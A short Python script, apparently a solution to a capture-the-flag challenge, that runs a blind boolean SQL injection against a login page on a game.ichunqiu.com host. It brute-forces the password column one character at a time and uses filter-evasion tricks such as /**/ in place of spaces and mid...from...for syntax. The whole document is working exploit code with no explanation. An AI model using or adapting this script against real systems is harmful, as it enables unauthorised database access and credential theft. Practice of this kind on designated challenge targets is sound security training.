import requests
import string

ch = string.ascii_lowercase+string.digits+'-}'+'{'

re = requests.session()
url = 'http://53b00b880684449d8b9784e95a0202e28dd6259b4ead4cda.game.ichunqiu.com/sql.php'

flag = ''
for i in range(1,100):
    for j in ch:
        payload = "wuyanzu'&&(mid((passwd)from({})for(1))in('{}'))/**/limit/**/1#".format(i,j)
        data = dict(uname=payload,passwd='adsl1234',submit='login')
        # print data
        html = re.post(url, data=data)
        # print html.text
        if 'passwd' in html.text:
            flag += j
            print flag
            break

